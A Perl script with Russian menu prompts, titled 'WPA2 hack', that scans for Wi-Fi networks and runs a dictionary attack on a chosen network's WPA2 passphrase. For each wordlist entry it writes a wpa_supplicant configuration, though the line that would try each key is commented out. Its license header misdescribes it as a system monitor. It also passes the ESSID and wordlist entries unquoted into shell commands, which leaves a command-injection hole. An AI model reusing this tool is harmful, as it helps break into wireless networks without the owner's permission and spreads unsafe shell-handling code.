#!/usr/bin/perl
# app, a system monitor, based on DrSmyrke
#
# Any original DrSmyrke code is licensed under the BSD license
#
# All code written since the fork of DrSmyrke is licensed under the GPL
#
#
# Copyright (c) 2015 Prokofiev Y. <Smyrke2005@yandex.ru>
# All rights reserved.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#
print "WPA2 hack (EDITION by Dr.Smyrke)\n";
print "\nВведите название интерфейса: ";$interface=<>;$interface=substr($interface,0,-1);
&menu;
sub menu{
print "\n=== Меню ===\n";
print "1.Сканирование сетей\n";
print "2.Перебор по словарю\n";
print "0.Выход\n\n";
print "Введите пункт меню (0-9): ";$menuid=<>;$menuid=substr($menuid,0,-1);
if($menuid==1){&scan;}
if($menuid==2){&vslov;&vzlom;}
if($menuid==0){goto ext;}
&menu;
}
sub vslov{
$cmd=`zenity --file-selection`;
$slov=substr($cmd,0,-1);
open(fs,"<$slov");@data=<fs>;close(fs);
$totslov=@data;
}
sub scan{system("iwlist $interface scan");}
sub vzlom{
print "Введите ESSID:";$ESSID=<>;$ESSID=substr($ESSID,0,-1);
$i=0;
foreach $f(@data){
$f=substr($f,0,-1);
print "\n[$i/$totslov] PS:[$f]\n\n";
system("wpa_passphrase $ESSID $f > wpa_supplicant.conf");
open(fs,"<wpa_supplicant.conf");@tmp=<fs>;close(fs);
$tm=@tmp;@tmp[$tm-1]="";
open(fs,">wpa_supplicant.conf");
print fs @tmp;
print fs "	key_mgmt=WPA-PSK\n";
print fs "	proto=RSN\n";
print fs "	pairwise=CCMP\n";
print fs "	group=CCMP\n";
print fs "}";
close(fs);
#$cmd=`wpa_supplicant -i$interface -c wpa_supplicant.conf`;
$i++;}
}
ext:
